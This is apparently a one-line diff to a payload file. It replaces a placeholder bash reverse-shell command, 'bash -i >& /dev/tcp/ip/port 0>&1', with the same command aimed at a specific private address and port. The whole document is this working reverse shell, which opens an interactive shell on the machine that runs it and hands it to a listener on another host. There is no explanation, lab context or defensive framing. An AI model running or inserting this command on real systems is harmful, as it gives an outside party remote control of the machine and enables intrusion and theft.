@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/ip/port 0>&1
+bash -i >& /dev/tcp/192.168.30.186/1234 0>&1
